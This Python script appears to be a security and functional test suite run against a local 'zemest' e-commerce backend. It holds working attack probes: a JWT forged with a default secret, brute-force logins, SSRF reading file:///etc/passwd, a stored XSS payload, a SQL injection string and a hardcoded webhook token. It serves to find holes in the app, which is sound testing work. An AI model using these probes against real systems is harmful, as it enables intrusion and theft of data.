#!/usr/bin/env python3
"""Live exploit + deep functional test against zemest backend (crash-proof).
Every check wrapped in try/except so one server crash doesn't stop the suite.
"""
import json
import time
import httpx
from jose import jwt

BASE = "http://localhost:8000"
TENANT = "1006adca-7f39-4f93-8d1c-49e72fb3c113"
DEFAULT_SECRET = "change-me-to-a-random-secret-key"

out = []


def log(name, ok, detail=""):
    out.append((name, ok, detail))
    print(f"{'[OK]' if ok else '[!!]'} {name} :: {detail[:200]}")


def safe(name, fn):
    try:
        fn()
    except Exception as e:
        log(name, False, f"EXC {type(e).__name__}: {str(e)[:150]}")


def fresh_client():
    return httpx.Client(base_url=BASE, timeout=30.0)


def get_token(c, email="owner@cairo-sneakers.com", pw="OwnerPass123"):
    r = c.post("/api/auth/login", json={"email": email, "password": pw})
    if r.status_code == 200:
        return r.json().get("access_token")
    return None


# ---------- 1. AI chat ----------
def t_chat():
    c = fresh_client()
    token = get_token(c)
    t0 = time.perf_counter()
    r = c.post("/api/test/chat", json={"tenant_id": TENANT, "message": "hi, what shoes do you have?"})
    dt = (time.perf_counter() - t0) * 1000
    log("AI chat flagship (no LLM key set)", True, f"{r.status_code} in {dt:.0f}ms :: {r.text[:220]}")


safe("AI chat", t_chat)

# ---------- 2. Orders MissingGreenlet ----------
def t_orders():
    c = fresh_client()
    token = get_token(c)
    r = c.post(f"/api/tenants/{TENANT}/orders", headers={"Authorization": f"Bearer {token}"},
               json={"customer_name": "Ahmed Test", "customer_phone": "01000000001",
                     "governorate": "cairo", "city": "Nasr City",
                     "items": [{"product_name": "Air Max 90 White", "quantity": 1, "unit_price": 1850}]})
    log("POST /orders (MissingGreenlet 500?)", True, f"{r.status_code} :: {r.text[:220]}")


safe("orders bug", t_orders)

# ---------- 3. Shipping float(dict) ----------
def t_shipping():
    c = fresh_client()
    r = c.get("/api/address/shipping", params={"governorate": "cairo"})
    log("GET /api/address/shipping (float(dict) 500?)", True, f"{r.status_code} :: {r.text[:220]}")


safe("shipping bug", t_shipping)

# ---------- 4. Forged JWT with default secret ----------
def t_forge():
    c = fresh_client()
    token = get_token(c)
    me = c.get("/api/auth/me", headers={"Authorization": f"Bearer {token}"}).json()
    forged = jwt.encode({"sub": me["id"], "exp": int(time.time()) + 3600, "type": "access"},
                        DEFAULT_SECRET, algorithm="HS256")
    r = c.get("/api/tenants", headers={"Authorization": f"Bearer {forged}"})
    if r.status_code == 200:
        log("HACK forged JWT (default secret)", True, f"ACCEPTED {r.status_code} :: tenants visible: {len(r.json())}")
    else:
        log("HACK forged JWT (default secret)", False, f"rejected {r.status_code} {r.text[:120]}")


safe("forged JWT", t_forge)

# ---------- 5. Unauth dashboard ----------
def t_dashboard():
    c = fresh_client()
    for path in [f"/dashboard/{TENANT}", f"/dashboard/{TENANT}/chat", f"/dashboard/{TENANT}/orders",
                 "/dashboard", f"/dashboard/{TENANT}/analytics"]:
        r = c.get(path, follow_redirects=False)
        exposed = r.status_code == 200
        log(f"HACK unauth {path}", exposed,
            f"EXPOSED ({r.status_code}) — no login required" if exposed else f"blocked ({r.status_code})")


safe("unauth dashboard", t_dashboard)

# ---------- 6. Brute force ----------
def t_brute():
    c = fresh_client()
    t0 = time.perf_counter()
    codes = []
    for i in range(25):
        r = c.post("/api/auth/login", json={"email": "owner@cairo-sneakers.com", "password": f"wrong{i}"})
        codes.append(r.status_code)
    dt = (time.perf_counter() - t0) * 1000
    log("HACK brute-force 25 logins", 429 not in codes,
        f"NO RATE LIMIT {set(codes)} in {dt:.0f}ms" if 429 not in codes else f"rate-limited {set(codes)}")


safe("brute force", t_brute)

# ---------- 7. SSRF crawl file:// ----------
def t_ssrf():
    c = fresh_client()
    token = get_token(c)
    r = c.post(f"/api/tenants/{TENANT}/crawl", headers={"Authorization": f"Bearer {token}"},
               json={"url": "file:///etc/passwd", "depth": 1})
    log("HACK SSRF crawl file:///etc/passwd", r.status_code in (200, 202),
        f"{r.status_code} :: {r.text[:200]}")
    time.sleep(3)
    # check if /etc/passwd content landed in the knowledge base
    r2 = c.get(f"/api/tenants/{TENANT}", headers={"Authorization": f"Bearer {token}"})
    body = r2.text
    hit = "root:" in body or "passwd" in body.lower()
    log("HACK SSRF exfil into knowledge base?", hit, f"{'CONFIRMED — /etc/passwd content stored: ' + body[:150] if hit else 'not visible via tenant GET (check KB table manually)'}")


safe("SSRF crawl", t_ssrf)

# ---------- 8. SSRF import-url internal ----------
def t_ssrf2():
    c = fresh_client()
    token = get_token(c)
    r = c.post(f"/api/tenants/{TENANT}/products/import-url", headers={"Authorization": f"Bearer {token}"},
               json={"url": "http://localhost:8000/openapi.json"})
    log("HACK SSRF import-url → localhost:8000 (internal scan)", r.status_code < 500,
        f"{r.status_code} :: {r.text[:200]}")


safe("SSRF import-url", t_ssrf2)

# ---------- 9. Stored XSS ----------
def t_xss():
    c = fresh_client()
    token = get_token(c)
    r = c.post(f"/api/tenants/{TENANT}/orders", headers={"Authorization": f"Bearer {token}"},
               json={"customer_name": "<img src=x onerror=alert(1)>", "customer_phone": "01000000002",
                     "items": [{"product_name": "Air Force 1 Black", "quantity": 1, "unit_price": 1650}]})
    stored = "<img" in r.text
    log("HACK stored XSS via customer_name", stored,
        f"STORED RAW ({r.status_code}) :: {r.text[:150]}" if stored else f"{r.status_code} :: {r.text[:150]}")


safe("stored XSS", t_xss)

# ---------- 10. SQLi ----------
def t_sqli():
    c = fresh_client()
    r = c.post("/api/auth/login", json={"email": "' OR 1=1 --", "password": "x"})
    log("SQLi probe login", r.status_code in (401, 422), f"{r.status_code} :: {r.text[:120]}")


safe("SQLi", t_sqli)

# ---------- 11. Webhook default token ----------
def t_webhook():
    c = fresh_client()
    r = c.get("/api/webhook/messenger",
              params={"hub.mode": "subscribe", "hub.verify_token": "zemest-verify-token", "hub.challenge": "123"})
    log("HACK webhook hardcoded verify token", r.status_code == 200,
        f"{r.status_code} :: default token accepted → {r.text[:60]}")


safe("webhook token", t_webhook)

# ---------- 12. Admin panel exposure ----------
def t_admin():
    c = fresh_client()
    r = c.get("/_admin/login")
    log("sqladmin panel exposed", r.status_code == 200, f"{r.status_code} :: admin login page public")
    r2 = c.get("/_admin/dashboard")
    log("admin dashboard route", r2.status_code in (200, 307, 401), f"{r2.status_code}")


safe("admin panel", t_admin)

print("\n" + "=" * 95)
confirmed = [(n, d) for n, ok, d in out if n.startswith("HACK") and ok]
print(f"TOTAL {len(out)} checks | HACK PROOFS CONFIRMED: {len(confirmed)}")
for n, d in confirmed:
    print(f"  ⚠ {n} :: {d[:100]}")
